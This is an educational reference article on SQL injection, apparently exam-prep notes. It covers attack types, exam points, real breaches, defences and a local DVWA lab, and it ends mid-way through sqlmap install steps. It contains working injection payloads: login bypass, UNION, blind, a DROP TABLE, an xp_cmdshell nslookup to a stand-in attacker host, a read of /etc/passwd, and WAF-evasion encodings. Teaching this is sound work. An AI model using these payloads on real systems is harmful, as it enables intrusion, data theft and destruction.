---
domain: "application security"
tags: [injection, web-security, owasp, database, attack, vulnerability]
---
# SQL Injection

**SQL Injection (SQLi)** is a code injection attack technique where malicious **Structured Query Language (SQL)** statements are inserted into an entry field or parameter, causing a backend [[Database]] to execute unintended commands. It remains one of the most prevalent and dangerous web application vulnerabilities, consistently ranked in the [[OWASP Top 10]] since the list's inception. Successful exploitation can lead to unauthorized data access, authentication bypass, data manipulation, and in some configurations, full [[Remote Code Execution]].

---

## Overview

SQL Injection exists because many web applications construct database queries by directly concatenating user-supplied input into SQL strings without proper sanitization or parameterization. When a developer writes code like `"SELECT * FROM users WHERE username = '" + userInput + "'"`, they are trusting that the user will supply a benign value like `alice`. An attacker instead supplies something like `alice' OR '1'='1`, fundamentally altering the logic of the query. The root cause is a failure to distinguish between *data* and *code*, one of the most foundational security principles in software development.

The vulnerability class is extraordinarily broad in scope. SQLi affects applications using virtually any SQL-based relational database backend — including MySQL, PostgreSQL, Microsoft SQL Server, Oracle, and SQLite — and can manifest across any input channel: web forms, URL parameters, cookies, HTTP headers, and even JSON or XML payloads submitted to APIs. Because databases are the primary storage mechanism for sensitive data (credentials, personal information, financial records, intellectual property), SQL injection has historically been the attack vector behind some of the most damaging breaches in history.

High-profile incidents attributed to SQL injection include the 2008 Heartland Payment Systems breach (exposing over 130 million credit card numbers), the 2011 Sony Pictures breach, and the 2012 LinkedIn breach. More recently, government and healthcare databases have been routinely compromised via SQLi, demonstrating that despite decades of awareness, the vulnerability class persists due to developer error, legacy codebases, and inadequate security testing practices.

SQLi sits under the broader category of [[Injection Attacks]], which also includes [[Command Injection]], [[LDAP Injection]], and [[XML Injection]]. OWASP classifies injection as the third most critical web application risk category in its 2021 Top 10. Automated exploitation tools and widely available tutorials have lowered the skill threshold required, making SQLi a common weapon in the arsenal of [[Script Kiddie]] attackers and advanced threat actors alike.

---

## How It Works

### The Anatomy of a Vulnerable Query

Consider a typical login form. The backend PHP code might look like this:

```php
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($conn, $query);
```

If the attacker enters the following into the username field:

```
' OR '1'='1' --
```

The resulting SQL query becomes:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'anything'
```

The `--` is a SQL comment delimiter (MySQL/MSSQL) that causes the database engine to ignore everything after it, including the password check. The condition `'1'='1'` is always true, so the query returns the first user in the database — often an administrative account — without requiring a valid password.

### Types of SQL Injection

**1. In-Band SQLi (Classic)**
The most straightforward type, where the attacker uses the same communication channel for both the injection and the result retrieval.

- **Error-Based SQLi**: Forces the database to throw verbose error messages that reveal schema information, table names, column names, and data.
  ```sql
  ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --
  ```
  
- **Union-Based SQLi**: Uses the `UNION` SQL operator to append additional `SELECT` statements, merging attacker-controlled query results with the legitimate response.
  ```sql
  ' UNION SELECT null, username, password FROM users --
  ```
  For a UNION attack to work, the injected query must return the same number of columns and compatible data types as the original query.

**2. Blind SQLi**
Used when the application does not return query results or error messages directly, but the attacker can infer information based on the application's behavior.

- **Boolean-Based Blind**: The attacker asks the database true/false questions and infers data from the application's differing responses.
  ```sql
  ' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a' --
  ```
  If the page loads normally, the first character of the username is `a`.

- **Time-Based Blind**: The attacker injects commands that cause the database to pause for a measurable time, inferring truth/false based on response delay.
  ```sql
  '; IF (SELECT COUNT(*) FROM users) > 0 WAITFOR DELAY '0:0:5' --   (MSSQL)
  ' AND SLEEP(5) --   (MySQL)
  ```

**3. Out-of-Band SQLi**
Data is exfiltrated via a different channel — for example, by forcing the database server to make a DNS or HTTP request to an attacker-controlled server. This requires specific database features to be enabled.

```sql
'; EXEC xp_cmdshell('nslookup attacker.com') --   (MSSQL with xp_cmdshell)
' UNION SELECT LOAD_FILE('/etc/passwd') INTO OUTFILE '/var/www/html/output.txt' --   (MySQL with FILE privilege)
```

### Second-Order (Stored) SQLi

In second-order injection, the malicious payload is stored in the database during one request and executed during a subsequent database read operation. The application may sanitize input on write but fails to sanitize on retrieval, or developers assume stored data is "safe."

### Discovery Process

1. **Identify injection points**: URL parameters (`?id=1`), POST body fields, cookies, HTTP headers (`User-Agent`, `Referer`, `X-Forwarded-For`)
2. **Probe with special characters**: `'`, `"`, `;`, `--`, `#`, `/**/`
3. **Observe application behavior**: Error messages, blank pages, behavioral differences
4. **Enumerate database**: Determine DBMS type, version, database names, tables, columns
5. **Extract data**: Use UNION, blind techniques, or out-of-band channels
6. **Escalate**: Attempt privilege escalation, OS command execution via database features

---

## Key Concepts

- **Parameterized Queries (Prepared Statements)**: The primary defense against SQLi; the query structure is defined before user input is bound, ensuring user input is always treated as data, never as executable SQL code. Supported natively in virtually all modern database APIs.

- **Tautology Attack**: An injection technique that inserts a condition that is always true (`OR 1=1`, `OR 'a'='a'`) to bypass WHERE clause logic, commonly used for authentication bypass.

- **Stacked Queries**: Some database drivers allow multiple SQL statements separated by semicolons in a single query string (e.g., `'; DROP TABLE users; --`). Whether stacked queries work depends on the database and API being used.

- **Out-of-Band Channel**: A secondary communication pathway used in advanced SQLi to exfiltrate data when in-band responses are not available; commonly leverages DNS lookup features (`xp_dirtree` in MSSQL, `UTL_HTTP` in Oracle).

- **Error Suppression vs. Error Disclosure**: Applications that display verbose database error messages (e.g., "You have an error in your SQL syntax near...") give attackers critical reconnaissance data; error disclosure should be disabled in production and logged server-side only.

- **SQL Fingerprinting**: The process of identifying the underlying DBMS by observing differences in SQL syntax, error messages, and behavior between systems (e.g., MySQL uses `#` for comments, MSSQL uses `--`, Oracle requires `FROM dual`).

- **WAF Bypass**: Attackers use encoding techniques (URL encoding, double URL encoding, hex encoding, case variation, comment insertion) to circumvent Web Application Firewall signatures: `sElEcT`, `SE/**/LECT`, `%53%45%4C%45%43%54`.

---

## Exam Relevance

**Security+ SY0-701** tests SQLi within the domains of **Application Security (Domain 4)** and **Threats, Attacks, and Vulnerabilities (Domain 2)**.

**Key testable points:**
- SQLi is classified as an **injection attack** — know that it exploits improper input validation
- The primary countermeasure is **input validation** AND **parameterized queries/prepared statements** — both terms appear on exams
- SQLi allows for **authentication bypass**, **data exfiltration**, **data manipulation**, and potentially **privilege escalation**
- Know that SQLi is different from [[Cross-Site Scripting (XSS)]]: SQLi targets the **database/backend**, XSS targets **other users' browsers**
- SQLi is consistently in the **OWASP Top 10** — the exam may reference this framework

**Common question patterns:**
- "A developer concatenates user input directly into SQL queries. Which attack does this enable?" → **SQL Injection**
- "What is the BEST way to prevent SQL injection?" → **Parameterized queries** (not input filtering alone)
- "Which type of SQLi does not return data directly to the attacker?" → **Blind SQL Injection**
- Scenario: login bypass using `admin'--` → identify as **SQLi authentication bypass**

**Gotchas:**
- Do not confuse **stored procedures** with **parameterized queries** — stored procedures can still be vulnerable if they internally concatenate strings
- **Input validation/sanitization alone** is NOT considered a sufficient defense; parameterized queries are the definitive answer
- **Web Application Firewalls (WAFs)** are a defensive layer but not a complete fix on their own

---

## Security Implications

### Attack Surface

SQLi affects any application layer that constructs SQL queries from user-controlled input: HTTP GET/POST parameters, REST API JSON bodies, GraphQL queries, cookie values, HTTP headers, and imported data files.

### Real CVEs and Incidents

- **CVE-2012-1823 (PHP-CGI)**: While primarily a PHP issue, it enabled injection into query strings, demonstrating how SQL injection can chain with other vulnerabilities.
- **CVE-2019-9193 (PostgreSQL COPY TO/FROM PROGRAM)**: Combined with SQLi, allowed remote code execution via superuser privileges.
- **Heartland Payment Systems (2008)**: SQLi against a web application led to installation of malware on internal systems and exfiltration of 130+ million card numbers; resulted in ~$140 million in settlements.
- **TalkTalk Breach (2015)**: SQLi by a 17-year-old attacker exposed 157,000 customer records; the company faced a £400,000 fine from the UK ICO.
- **Accellion FTA (2021, CVE-2021-27101)**: SQL injection in the Accellion File Transfer Appliance was exploited by the CLOP ransomware group, affecting dozens of major organizations worldwide.

### Detection Indicators

- Unexpected database errors in application logs or HTTP responses
- Unusual query patterns in database slow query logs
- Anomalous spikes in database query volume
- Requests containing SQL keywords (`UNION`, `SELECT`, `INSERT`, `DROP`, `--`) in input parameters
- [[IDS/IPS]] signatures firing on known SQLi patterns
- Time delays in application responses consistent with time-based blind injection

---

## Defensive Measures

### 1. Parameterized Queries / Prepared Statements (Primary Defense)

Always use parameterized queries. The database pre-compiles the query structure; user input is bound as a typed parameter and cannot alter query logic.

**Python (psycopg2 – PostgreSQL):**
```python
# VULNERABLE - never do this
cursor.execute("SELECT * FROM users WHERE username = '" + username + "'")

# SAFE - parameterized query
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

**Java (JDBC):**
```java
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ? AND password = ?"
);
stmt.setString(1, username);
stmt.setString(2, password);
```

**PHP (PDO):**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->execute(['username' => $username]);
```

### 2. Stored Procedures (with care)

Stored procedures can encapsulate SQL logic, but only protect against SQLi if they themselves use parameterized binding internally. A stored procedure that concatenates strings internally is still vulnerable.

### 3. Input Validation and Allowlisting

Validate that input conforms to expected format, type, length, and character set. Use allowlists (permitted characters) rather than denylists (blocked characters). For numeric IDs, enforce integer type casting.

```python
import re
if not re.match(r'^\w{1,50}$', username):
    raise ValueError("Invalid username format")
```

### 4. Web Application Firewall (WAF)

Deploy a WAF such as **ModSecurity** (open source, pairs with Apache/Nginx), **AWS WAF**, **Cloudflare WAF**, or **NAXSI**. Use the OWASP Core Rule Set (CRS) as a baseline.

```bash
# ModSecurity with OWASP CRS (Nginx example)
apt install libmodsecurity3 libmodsecurity-dev
# Enable OWASP CRS rules in modsecurity.conf
SecRuleEngine On
Include /etc/nginx/modsec/coreruleset/rules/*.conf
```

### 5. Principle of Least Privilege on Database Accounts

Web application database accounts should have only the minimum necessary privileges. A read-only application needs only `SELECT`. Never connect as `root` or `sa`.

```sql
-- MySQL: create restricted app user
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'StrongPassword!';
GRANT SELECT, INSERT, UPDATE ON appdb.* TO 'webapp'@'localhost';
-- Deny dangerous privileges
REVOKE FILE ON *.* FROM 'webapp'@'localhost';
```

### 6. Error Handling

Disable verbose database error output in production. Log detailed errors server-side; return generic messages to users.

```php
// PHP - disable display_errors in php.ini
display_errors = Off
log_errors = On
error_log = /var/log/php_errors.log
```

### 7. Security Testing Integration

- **SAST (Static Analysis)**: Integrate tools like **Semgrep**, **SonarQube**, or **Checkmarx** into CI/CD pipelines to catch unsafe query construction at code review time.
- **DAST (Dynamic Analysis)**: Run **OWASP ZAP** or **Burp Suite** automated scans against staging environments.
- **Penetration Testing**: Schedule regular SQLi-focused penetration tests against production APIs.

---

## Lab / Hands-On

### Environment Setup

Use **DVWA (Damn Vulnerable Web Application)** or **WebGoat** in a controlled homelab environment. Never practice on systems you do not own.

```bash
# Pull and run DVWA via Docker
docker pull vulnerables/web-dvwa
docker run -d -p 8080:80 vulnerables/web-dvwa

# Access at http://localhost:8080
# Default credentials: admin / password
# Set security level to LOW for initial practice
```

### Manual SQLi Testing

```bash
# Test a URL parameter for SQLi
curl "http://localhost:8080/vulnerabilities/sqli/?id=1'&Submit=Submit"

# Test for UNION-based injection (find column count)
curl "http://localhost:8080/vulnerabilities/sqli/?id=1' ORDER BY 3--+"
# Increment until error occurs (reveals column count)

# Extract database version via UNION
curl "http://localhost:8080/vulnerabilities/sqli/?id=1' UNION SELECT null,version()--+"
```

### Automated Exploitation with sqlmap

**sqlmap** is the industry-standard open-source SQLi automation tool.

```bash
# Install sqlmap
sudo apt install sqlmap   # Kali Linux / Debian
# or
git clone https://github.com